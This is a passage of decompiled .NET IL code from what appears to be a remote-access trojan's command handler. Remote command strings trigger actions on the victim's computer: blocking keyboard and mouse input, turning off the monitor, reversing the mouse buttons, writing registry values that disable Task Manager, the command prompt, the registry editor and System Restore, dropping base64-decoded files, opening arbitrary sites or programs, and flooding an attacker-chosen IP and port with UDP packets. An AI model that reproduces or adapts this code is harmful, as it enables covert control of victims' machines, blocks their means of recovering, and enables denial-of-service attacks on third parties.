      IL_0322:  ldtoken    [mscorlib]System.String
      IL_0327:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_032c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0331:  castclass  [mscorlib]System.String
      IL_0336:  stelem.ref
      IL_0337:  nop
      IL_0338:  br         IL_0bd7

      IL_033d:  nop
      IL_033e:  ldloc.s    VB$t_string$L0
      IL_0340:  ldstr      "BepX"
      IL_0345:  ldc.i4.0
      IL_0346:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_034b:  ldc.i4.0
      IL_034c:  ceq
      IL_034e:  stloc.s    VB$CG$t_bool$S1
      IL_0350:  ldloc.s    VB$CG$t_bool$S1
      IL_0352:  brfalse.s  IL_037c

      IL_0354:  nop
      IL_0355:  ldloc.0
      IL_0356:  ldc.i4.1
      IL_0357:  ldelem.ref
      IL_0358:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Val(string)
      IL_035d:  call       float64 [mscorlib]System.Math::Round(float64)
      IL_0362:  conv.ovf.i4
      IL_0363:  ldloc.0
      IL_0364:  ldc.i4.2
      IL_0365:  ldelem.ref
      IL_0366:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Val(string)
      IL_036b:  call       float64 [mscorlib]System.Math::Round(float64)
      IL_0370:  conv.ovf.i4
      IL_0371:  call       void w.OK::Beep(int32,
                                           int32)
      IL_0376:  nop
      IL_0377:  br         IL_0bd7

      IL_037c:  nop
      IL_037d:  ldloc.s    VB$t_string$L0
      IL_037f:  ldstr      "piano"
      IL_0384:  ldc.i4.0
      IL_0385:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_038a:  ldc.i4.0
      IL_038b:  ceq
      IL_038d:  stloc.s    VB$CG$t_bool$S1
      IL_038f:  ldloc.s    VB$CG$t_bool$S1
      IL_0391:  brfalse.s  IL_03b2

      IL_0393:  nop
      IL_0394:  ldloc.0
      IL_0395:  ldc.i4.1
      IL_0396:  ldelem.ref
      IL_0397:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Val(string)
      IL_039c:  call       float64 [mscorlib]System.Math::Round(float64)
      IL_03a1:  conv.ovf.i4
      IL_03a2:  ldc.i4     0x12c
      IL_03a7:  call       void w.OK::Beep(int32,
                                           int32)
      IL_03ac:  nop
      IL_03ad:  br         IL_0bd7

      IL_03b2:  nop
      IL_03b3:  ldloc.s    VB$t_string$L0
      IL_03b5:  ldstr      "OpenCD"
      IL_03ba:  ldc.i4.0
      IL_03bb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03c0:  ldc.i4.0
      IL_03c1:  ceq
      IL_03c3:  stloc.s    VB$CG$t_bool$S1
      IL_03c5:  ldloc.s    VB$CG$t_bool$S1
      IL_03c7:  brfalse.s  IL_03eb

      IL_03c9:  nop
      IL_03ca:  ldstr      "set CDAudio door open"
      IL_03cf:  stloc.s    VB$t_string$S3
      IL_03d1:  ldloca.s   VB$t_string$S3
      IL_03d3:  ldstr      ""
      IL_03d8:  stloc.s    VB$t_string$S4
      IL_03da:  ldloca.s   VB$t_string$S4
      IL_03dc:  ldc.i4.0
      IL_03dd:  conv.i8
      IL_03de:  ldc.i4.0
      IL_03df:  conv.i8
      IL_03e0:  call       int64 w.OK::mciSendString(string&,
                                                     string&,
                                                     int64,
                                                     int64)
      IL_03e5:  pop
      IL_03e6:  br         IL_0bd7

      IL_03eb:  nop
      IL_03ec:  ldloc.s    VB$t_string$L0
      IL_03ee:  ldstr      "CloseCD"
      IL_03f3:  ldc.i4.0
      IL_03f4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03f9:  ldc.i4.0
      IL_03fa:  ceq
      IL_03fc:  stloc.s    VB$CG$t_bool$S1
      IL_03fe:  ldloc.s    VB$CG$t_bool$S1
      IL_0400:  brfalse.s  IL_0424

      IL_0402:  nop
      IL_0403:  ldstr      "set CDAudio door closed"
      IL_0408:  stloc.s    VB$t_string$S4
      IL_040a:  ldloca.s   VB$t_string$S4
      IL_040c:  ldstr      ""
      IL_0411:  stloc.s    VB$t_string$S3
      IL_0413:  ldloca.s   VB$t_string$S3
      IL_0415:  ldc.i4.0
      IL_0416:  conv.i8
      IL_0417:  ldc.i4.0
      IL_0418:  conv.i8
      IL_0419:  call       int64 w.OK::mciSendString(string&,
                                                     string&,
                                                     int64,
                                                     int64)
      IL_041e:  pop
      IL_041f:  br         IL_0bd7

      IL_0424:  nop
      IL_0425:  ldloc.s    VB$t_string$L0
      IL_0427:  ldstr      "DisableKM"
      IL_042c:  ldc.i4.0
      IL_042d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0432:  ldc.i4.0
      IL_0433:  ceq
      IL_0435:  stloc.s    VB$CG$t_bool$S1
      IL_0437:  ldloc.s    VB$CG$t_bool$S1
      IL_0439:  brfalse.s  IL_0448

      IL_043b:  nop
      IL_043c:  ldc.i4.1
      IL_043d:  call       int32 w.OK::apiBlockInput(int32)
      IL_0442:  pop
      IL_0443:  br         IL_0bd7

      IL_0448:  nop
      IL_0449:  ldloc.s    VB$t_string$L0
      IL_044b:  ldstr      "EnableKM"
      IL_0450:  ldc.i4.0
      IL_0451:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0456:  ldc.i4.0
      IL_0457:  ceq
      IL_0459:  stloc.s    VB$CG$t_bool$S1
      IL_045b:  ldloc.s    VB$CG$t_bool$S1
      IL_045d:  brfalse.s  IL_046c

      IL_045f:  nop
      IL_0460:  ldc.i4.0
      IL_0461:  call       int32 w.OK::apiBlockInput(int32)
      IL_0466:  pop
      IL_0467:  br         IL_0bd7

      IL_046c:  nop
      IL_046d:  ldloc.s    VB$t_string$L0
      IL_046f:  ldstr      "TurnOffMonitor"
      IL_0474:  ldc.i4.0
      IL_0475:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_047a:  ldc.i4.0
      IL_047b:  ceq
      IL_047d:  stloc.s    VB$CG$t_bool$S1
      IL_047f:  ldloc.s    VB$CG$t_bool$S1
      IL_0481:  brfalse.s  IL_049b

      IL_0483:  nop
      IL_0484:  ldc.i4.m1
      IL_0485:  ldc.i4     0x112
      IL_048a:  ldc.i4     0xf170
      IL_048f:  ldc.i4.2
      IL_0490:  call       void w.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_0495:  nop
      IL_0496:  br         IL_0bd7

      IL_049b:  nop
      IL_049c:  ldloc.s    VB$t_string$L0
      IL_049e:  ldstr      "TurnOnMonitor"
      IL_04a3:  ldc.i4.0
      IL_04a4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04a9:  ldc.i4.0
      IL_04aa:  ceq
      IL_04ac:  stloc.s    VB$CG$t_bool$S1
      IL_04ae:  ldloc.s    VB$CG$t_bool$S1
      IL_04b0:  brfalse.s  IL_04ca

      IL_04b2:  nop
      IL_04b3:  ldc.i4.m1
      IL_04b4:  ldc.i4     0x112
      IL_04b9:  ldc.i4     0xf170
      IL_04be:  ldc.i4.m1
      IL_04bf:  call       void w.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_04c4:  nop
      IL_04c5:  br         IL_0bd7

      IL_04ca:  nop
      IL_04cb:  ldloc.s    VB$t_string$L0
      IL_04cd:  ldstr      "NormalMouse"
      IL_04d2:  ldc.i4.0
      IL_04d3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04d8:  ldc.i4.0
      IL_04d9:  ceq
      IL_04db:  stloc.s    VB$CG$t_bool$S1
      IL_04dd:  ldloc.s    VB$CG$t_bool$S1
      IL_04df:  brfalse.s  IL_04ef

      IL_04e1:  nop
      IL_04e2:  ldc.i4.0
      IL_04e3:  conv.i8
      IL_04e4:  call       int64 w.OK::SwapMouseButton(int64)
      IL_04e9:  pop
      IL_04ea:  br         IL_0bd7

      IL_04ef:  nop
      IL_04f0:  ldloc.s    VB$t_string$L0
      IL_04f2:  ldstr      "ReverseMouse"
      IL_04f7:  ldc.i4.0
      IL_04f8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04fd:  ldc.i4.0
      IL_04fe:  ceq
      IL_0500:  stloc.s    VB$CG$t_bool$S1
      IL_0502:  ldloc.s    VB$CG$t_bool$S1
      IL_0504:  brfalse.s  IL_0518

      IL_0506:  nop
      IL_0507:  ldc.i4     0x100
      IL_050c:  conv.i8
      IL_050d:  call       int64 w.OK::SwapMouseButton(int64)
      IL_0512:  pop
      IL_0513:  br         IL_0bd7

      IL_0518:  nop
      IL_0519:  ldloc.s    VB$t_string$L0
      IL_051b:  ldstr      "DisableCMD"
      IL_0520:  ldc.i4.0
      IL_0521:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0526:  ldc.i4.0
      IL_0527:  ceq
      IL_0529:  stloc.s    VB$CG$t_bool$S1
      IL_052b:  ldloc.s    VB$CG$t_bool$S1
      IL_052d:  brfalse.s  IL_0555

      IL_052f:  nop
      IL_0530:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_0535:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_053a:  ldstr      "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Wind"
      + "ows\\System"
      IL_053f:  ldstr      "DisableCMD"
      IL_0544:  ldstr      "1"
      IL_0549:  ldc.i4.4
      IL_054a:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_054f:  nop
      IL_0550:  br         IL_0bd7

      IL_0555:  nop
      IL_0556:  ldloc.s    VB$t_string$L0
      IL_0558:  ldstr      "EnableCMD"
      IL_055d:  ldc.i4.0
      IL_055e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0563:  ldc.i4.0
      IL_0564:  ceq
      IL_0566:  stloc.s    VB$CG$t_bool$S1
      IL_0568:  ldloc.s    VB$CG$t_bool$S1
      IL_056a:  brfalse.s  IL_0592

      IL_056c:  nop
      IL_056d:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_0572:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0577:  ldstr      "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Wind"
      + "ows\\System"
      IL_057c:  ldstr      "DisableCMD"
      IL_0581:  ldstr      "0"
      IL_0586:  ldc.i4.4
      IL_0587:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_058c:  nop
      IL_058d:  br         IL_0bd7

      IL_0592:  nop
      IL_0593:  ldloc.s    VB$t_string$L0
      IL_0595:  ldstr      "DisableRegistry"
      IL_059a:  ldc.i4.0
      IL_059b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05a0:  ldc.i4.0
      IL_05a1:  ceq
      IL_05a3:  stloc.s    VB$CG$t_bool$S1
      IL_05a5:  ldloc.s    VB$CG$t_bool$S1
      IL_05a7:  brfalse.s  IL_05cf

      IL_05a9:  nop
      IL_05aa:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_05af:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_05b4:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\System"
      IL_05b9:  ldstr      "DisableRegistryTools"
      IL_05be:  ldstr      "1"
      IL_05c3:  ldc.i4.4
      IL_05c4:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_05c9:  nop
      IL_05ca:  br         IL_0bd7

      IL_05cf:  nop
      IL_05d0:  ldloc.s    VB$t_string$L0
      IL_05d2:  ldstr      "EnableRegistry"
      IL_05d7:  ldc.i4.0
      IL_05d8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05dd:  ldc.i4.0
      IL_05de:  ceq
      IL_05e0:  stloc.s    VB$CG$t_bool$S1
      IL_05e2:  ldloc.s    VB$CG$t_bool$S1
      IL_05e4:  brfalse.s  IL_060c

      IL_05e6:  nop
      IL_05e7:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_05ec:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_05f1:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\System"
      IL_05f6:  ldstr      "DisableRegistryTools"
      IL_05fb:  ldstr      "0"
      IL_0600:  ldc.i4.4
      IL_0601:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0606:  nop
      IL_0607:  br         IL_0bd7

      IL_060c:  nop
      IL_060d:  ldloc.s    VB$t_string$L0
      IL_060f:  ldstr      "DisableRestore"
      IL_0614:  ldc.i4.0
      IL_0615:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_061a:  ldc.i4.0
      IL_061b:  ceq
      IL_061d:  stloc.s    VB$CG$t_bool$S1
      IL_061f:  ldloc.s    VB$CG$t_bool$S1
      IL_0621:  brfalse.s  IL_0649

      IL_0623:  nop
      IL_0624:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_0629:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_062e:  ldstr      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\C"
      + "urrentVersion\\SystemRestore"
      IL_0633:  ldstr      "DisableSR"
      IL_0638:  ldstr      "1"
      IL_063d:  ldc.i4.4
      IL_063e:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0643:  nop
      IL_0644:  br         IL_0bd7

      IL_0649:  nop
      IL_064a:  ldloc.s    VB$t_string$L0
      IL_064c:  ldstr      "EnableRestore"
      IL_0651:  ldc.i4.0
      IL_0652:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0657:  ldc.i4.0
      IL_0658:  ceq
      IL_065a:  stloc.s    VB$CG$t_bool$S1
      IL_065c:  ldloc.s    VB$CG$t_bool$S1
      IL_065e:  brfalse.s  IL_0686

      IL_0660:  nop
      IL_0661:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_0666:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_066b:  ldstr      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\C"
      + "urrentVersion\\SystemRestore"
      IL_0670:  ldstr      "DisableSR"
      IL_0675:  ldstr      "0"
      IL_067a:  ldc.i4.4
      IL_067b:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0680:  nop
      IL_0681:  br         IL_0bd7

      IL_0686:  nop
      IL_0687:  ldloc.s    VB$t_string$L0
      IL_0689:  ldstr      "DisableTaskManager"
      IL_068e:  ldc.i4.0
      IL_068f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0694:  ldc.i4.0
      IL_0695:  ceq
      IL_0697:  stloc.s    VB$CG$t_bool$S1
      IL_0699:  ldloc.s    VB$CG$t_bool$S1
      IL_069b:  brfalse.s  IL_06c3

      IL_069d:  nop
      IL_069e:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_06a3:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_06a8:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\System"
      IL_06ad:  ldstr      "DisableTaskMgr"
      IL_06b2:  ldstr      "1"
      IL_06b7:  ldc.i4.4
      IL_06b8:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_06bd:  nop
      IL_06be:  br         IL_0bd7

      IL_06c3:  nop
      IL_06c4:  ldloc.s    VB$t_string$L0
      IL_06c6:  ldstr      "EnableTaskManager"
      IL_06cb:  ldc.i4.0
      IL_06cc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06d1:  ldc.i4.0
      IL_06d2:  ceq
      IL_06d4:  stloc.s    VB$CG$t_bool$S1
      IL_06d6:  ldloc.s    VB$CG$t_bool$S1
      IL_06d8:  brfalse.s  IL_0700

      IL_06da:  nop
      IL_06db:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_06e0:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_06e5:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\System"
      IL_06ea:  ldstr      "DisableTaskMgr"
      IL_06ef:  ldstr      "0"
      IL_06f4:  ldc.i4.4
      IL_06f5:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_06fa:  nop
      IL_06fb:  br         IL_0bd7

      IL_0700:  nop
      IL_0701:  ldloc.s    VB$t_string$L0
      IL_0703:  ldstr      "CursorShow"
      IL_0708:  ldc.i4.0
      IL_0709:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_070e:  ldc.i4.0
      IL_070f:  ceq
      IL_0711:  stloc.s    VB$CG$t_bool$S1
      IL_0713:  ldloc.s    VB$CG$t_bool$S1
      IL_0715:  brfalse.s  IL_0723

      IL_0717:  nop
      IL_0718:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::Show()
      IL_071d:  nop
      IL_071e:  br         IL_0bd7

      IL_0723:  nop
      IL_0724:  ldloc.s    VB$t_string$L0
      IL_0726:  ldstr      "CursorHide"
      IL_072b:  ldc.i4.0
      IL_072c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0731:  ldc.i4.0
      IL_0732:  ceq
      IL_0734:  stloc.s    VB$CG$t_bool$S1
      IL_0736:  ldloc.s    VB$CG$t_bool$S1
      IL_0738:  brfalse.s  IL_0746

      IL_073a:  nop
      IL_073b:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::Hide()
      IL_0740:  nop
      IL_0741:  br         IL_0bd7

      IL_0746:  nop
      IL_0747:  ldloc.s    VB$t_string$L0
      IL_0749:  ldstr      "sendmusicplay"
      IL_074e:  ldc.i4.0
      IL_074f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0754:  ldc.i4.0
      IL_0755:  ceq
      IL_0757:  stloc.s    VB$CG$t_bool$S1
      IL_0759:  ldloc.s    VB$CG$t_bool$S1
      IL_075b:  brfalse.s  IL_07b7

      IL_075d:  nop
      IL_075e:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0763:  ldloc.0
      IL_0764:  ldc.i4.1
      IL_0765:  ldelem.ref
      IL_0766:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_076b:  ldloc.0
      IL_076c:  ldc.i4.2
      IL_076d:  ldelem.ref
      IL_076e:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0773:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                        uint8[])
      IL_0778:  nop
      IL_0779:  ldc.i4     0x3e8
      IL_077e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0783:  nop
      IL_0784:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_0789:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Audio [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Audio()
      IL_078e:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Audio::Stop()
      IL_0793:  nop
      IL_0794:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
      IL_0799:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Audio [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Audio()
      IL_079e:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_07a3:  ldloc.0
      IL_07a4:  ldc.i4.1
      IL_07a5:  ldelem.ref
      IL_07a6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_07ab:  ldc.i4.1
      IL_07ac:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Audio::Play(string,
                                                                                                          valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AudioPlayMode)
      IL_07b1:  nop
      IL_07b2:  br         IL_0bd7

      IL_07b7:  nop
      IL_07b8:  ldloc.s    VB$t_string$L0
      IL_07ba:  ldstr      "OpenSite"
      IL_07bf:  ldc.i4.0
      IL_07c0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07c5:  ldc.i4.0
      IL_07c6:  ceq
      IL_07c8:  stloc.s    VB$CG$t_bool$S1
      IL_07ca:  ldloc.s    VB$CG$t_bool$S1
      IL_07cc:  brfalse.s  IL_07dd

      IL_07ce:  nop
      IL_07cf:  ldloc.0
      IL_07d0:  ldc.i4.1
      IL_07d1:  ldelem.ref
      IL_07d2:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_07d7:  pop
      IL_07d8:  br         IL_0bd7

      IL_07dd:  nop
      IL_07de:  ldloc.s    VB$t_string$L0
      IL_07e0:  ldstr      "dos"
      IL_07e5:  ldc.i4.0
      IL_07e6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07eb:  ldc.i4.0
      IL_07ec:  ceq
      IL_07ee:  stloc.s    VB$CG$t_bool$S1
      IL_07f0:  ldloc.s    VB$CG$t_bool$S1
      IL_07f2:  brfalse.s  IL_0805

      IL_07f4:  nop
      IL_07f5:  ldstr      "dos"
      IL_07fa:  call       bool w.OK::Send(string)
      IL_07ff:  pop
      IL_0800:  br         IL_0bd7

      IL_0805:  nop
      IL_0806:  ldloc.s    VB$t_string$L0
      IL_0808:  ldstr      "udp"
      IL_080d:  ldc.i4.0
      IL_080e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0813:  ldc.i4.0
      IL_0814:  ceq
      IL_0816:  stloc.s    VB$CG$t_bool$S1
      IL_0818:  ldloc.s    VB$CG$t_bool$S1
      IL_081a:  brfalse    IL_08e1

      IL_081f:  nop
      IL_0820:  ldstr      "udp"
      IL_0825:  call       bool w.OK::Send(string)
      IL_082a:  pop
      IL_082b:  ldloc.0
      IL_082c:  ldc.i4.1
      IL_082d:  ldelem.ref
      IL_082e:  stsfld     string w.OK::TIP
      IL_0833:  ldloc.0
      IL_0834:  ldc.i4.2
      IL_0835:  ldelem.ref
      IL_0836:  stsfld     string w.OK::Tport
      IL_083b:  ldloc.0
      IL_083c:  ldc.i4.3
      IL_083d:  ldelem.ref
      IL_083e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0843:  stsfld     int32 w.OK::delay
      IL_0848:  ldc.i4.1
      IL_0849:  stsfld     bool w.OK::udp
      IL_084e:  nop
      .try
      {
        IL_084f:  br.s       IL_08c0

        IL_0851:  ldsfld     bool w.OK::udp
        IL_0856:  ldc.i4.0
        IL_0857:  ceq
        IL_0859:  stloc.s    VB$CG$t_bool$S1
        IL_085b:  ldloc.s    VB$CG$t_bool$S1
        IL_085d:  brfalse.s  IL_0862

        IL_085f:  nop
        IL_0860:  leave.s    IL_08db

        IL_0862:  nop
        .try
        {
          IL_0863:  ldsfld     string w.OK::TIP
          IL_0868:  call       class [System]System.Net.IPAddress [System]System.Net.IPAddress::Parse(string)
          IL_086d:  ldsfld     string w.OK::Tport
          IL_0872:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
          IL_0877:  newobj     instance void [System]System.Net.IPEndPoint::.ctor(class [System]System.Net.IPAddress,
                                                                                  int32)
          IL_087c:  stloc.s    ipendpoint1
          IL_087e:  ldc.i4     0x1000
          IL_0883:  newarr     [mscorlib]System.Byte
          IL_0888:  stloc.s    array1
          IL_088a:  ldc.i4.2
          IL_088b:  ldc.i4.2
          IL_088c:  ldc.i4.s   17
          IL_088e:  newobj     instance void [System]System.Net.Sockets.Socket::.ctor(valuetype [System]System.Net.Sockets.AddressFamily,
                                                                                      valuetype [System]System.Net.Sockets.SocketType,
                                                                                      valuetype [System]System.Net.Sockets.ProtocolType)
          IL_0893:  stloc.s    socket1
          IL_0895:  ldloc.s    socket1
          IL_0897:  ldloc.s    array1
          IL_0899:  ldloc.s    ipendpoint1
          IL_089b:  callvirt   instance int32 [System]System.Net.Sockets.Socket::SendTo(uint8[],
                                                                                        class [System]System.Net.EndPoint)
          IL_08a0:  pop
          IL_08a1:  ldsfld     int32 w.OK::delay
          IL_08a6:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
          IL_08ab:  nop
          IL_08ac:  leave.s    IL_08be

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_08ae:  dup
          IL_08af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_08b4:  stloc.s    V_14
          IL_08b6:  nop
          IL_08b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_08bc:  leave.s    IL_08be

        }  // end handler
        IL_08be:  nop
        IL_08bf:  nop
        IL_08c0:  ldc.i4.1
        IL_08c1:  stloc.s    VB$CG$t_bool$S1
